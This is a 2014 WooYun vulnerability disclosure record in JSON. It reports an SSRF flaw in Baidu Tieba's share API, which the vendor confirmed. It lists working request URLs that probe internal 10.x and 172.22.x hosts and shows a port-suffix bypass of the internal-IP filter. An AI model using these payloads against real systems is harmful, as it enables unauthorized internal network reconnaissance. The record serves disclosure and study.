{"id": 3108, "wybug_id": "wooyun-2014-061850", "wybug_title": "内网编织者百度内网手动编织!", "wybug_corp": "百度", "wybug_author": "Nebula", "wybug_date": "2014-05-22 11:41", "wybug_open_date": "2014-07-06 11:42", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "设计不当"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-06：\t细节向公众公开  简要描述： RT! 详细说明：  tieba功能设计缺陷形成SSRF漏洞,造成边界绕过:http://tieba.baidu.com/f/commit/share/openShareApi?url=http://www.wooyun.org/\n\n   漏洞证明：  至少可以来攻击内网:之前被人发现的内网ip段都好像加限制:http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.18\n\n不过,加个端口就简单绕过了(正则没写好?):\n\n其他随手随机测试的ip及网段:\nhttp://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.50.33.43:8080/http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.76:80http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.86:80http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.104:80http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.139:80http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.143:80http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.145:80http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.147:80http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.157:80http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.158:80http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.161:80http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.165:80http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.196:80http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.217:80http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.168:80http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.169:80http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.173:80http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.187:80http://172.22.1.*...http://tieba.baidu.com/f/commit/share/openShareApi?url=http://172.22.1.1http://tieba.baidu.com/f/commit/share/openShareApi?url=http://172.22.1.90...http://172.22.2.*http://tieba.baidu.com/f/commit/share/openShareApi?url=http://172.22.2.1http://172.22.3.*http://tieba.baidu.com/f/commit/share/openShareApi?url=http://172.22.3.1http://172.22.4.*http://tieba.baidu.com/f/commit/share/openShareApi?url=http://172.22.4.1http://172.22.5.*http://tieba.baidu.com/f/commit/share/openShareApi?url=http://172.22.7.1\n\n\n\n\n\n\n\n\n\n\n\n\n这样一个SSRF就让内网结构一目了然了!   修复方案：  至少限制内网请求!   版权声明：转载请注明来源 Nebula@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2014-05-22 12:10 厂商回复： 感谢对百度安全的支持。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-22 11:43 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  又。。又。。又编织了    \n     2014-05-22 12:06 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  最近上火，都是被你们吓的。。    \n     2014-05-22 12:21 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  给力啊，都怎么搞进去的    \n     2014-05-22 13:52 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  啥事编织？    \n     2014-05-22 20:39 |    \t\t浅兮 \t\t\t( 实习白帽子  |\t\t\t        Rank:70 漏洞数:30        )\t\t \n  什么叫编织啊！这么厉害新浪 百度都确认漏洞了！求公开漏洞啊！    \n     2014-06-11 13:20 |    \t\t梧桐雨  \t\t\t( 核心白帽子 |\t\t\t        Rank:1576 漏洞数:184        | 关注技术与网络安全)\t\t \n  早些年的这种分享出过很多问题。。那会还能读取到本地的etc/pass。    \n     2014-07-06 12:56 |    \t\t有点小鸡冻 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        )\t\t \n  我也去搞一搞，我来个FBI编织，。。。。。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}